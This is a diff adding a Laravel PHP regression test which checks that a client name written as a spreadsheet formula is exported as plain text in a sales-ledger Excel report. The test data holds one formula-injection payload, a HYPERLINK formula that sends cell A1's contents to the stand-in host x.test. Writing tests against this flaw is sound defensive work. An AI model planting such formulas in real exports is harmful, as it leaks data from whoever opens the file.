@@ -13,6 +13,7 @@ use App\Services\LibroDeVentas;
 use App\Services\Ventas;
 use Illuminate\Foundation\Testing\DatabaseTransactions;
 use Illuminate\Support\Facades\DB;
+use PhpOffice\PhpSpreadsheet\IOFactory;
 use Tests\TestCase;
 
 /**
@@ -247,5 +248,41 @@ class LibroDeVentasTest extends TestCase
         $this->actingAs($this->admin())
             ->get(route('reportes.ventas.pdf'))
             ->assertSessionHas('error', fn ($m) => str_contains($m, 'el PDF admite hasta 1'));
+    }
+
+    /**
+     * Un cliente registrado como «=HYPERLINK(...)» salía como fórmula viva en el
+     * Excel de quien lo abriera. Se guarda como texto.
+     */
+    public function test_un_nombre_que_parece_formula_sale_como_texto_en_el_excel(): void
+    {
+        $empresa = $this->empresa();
+        $empresa->forceFill(['razon_social' => '=HYPERLINK("http://x.test/?d="&A1,"Ver")'])->save();
+        $this->vender([['P-0001', 1]], $empresa->fresh());
+        $mes = now()->format('Y-m');
+
+        $respuesta = $this->actingAs($this->admin())->get(route('reportes.libro-ventas.excel', ['mes' => $mes]))->assertOk();
+        $fichero = tempnam(sys_get_temp_dir(), 'xlsx').'.xlsx';
+        file_put_contents($fichero, $respuesta->streamedContent());
+
+        try {
+            $libro = IOFactory::load($fichero);
+        } finally {
+            @unlink($fichero);
+        }
+
+        $celdas = [];
+        foreach ($libro->getAllSheets() as $hoja) {
+            foreach ($hoja->getRowIterator() as $fila) {
+                foreach ($fila->getCellIterator() as $celda) {
+                    if (str_contains((string) $celda->getValue(), 'HYPERLINK')) {
+                        $celdas[] = $celda->getDataType();
+                    }
+                }
+            }
+        }
+
+        $this->assertNotEmpty($celdas, 'el cliente no aparece en el libro');
+        $this->assertNotContains('f', $celdas, 'quedó como fórmula');
     }
 }
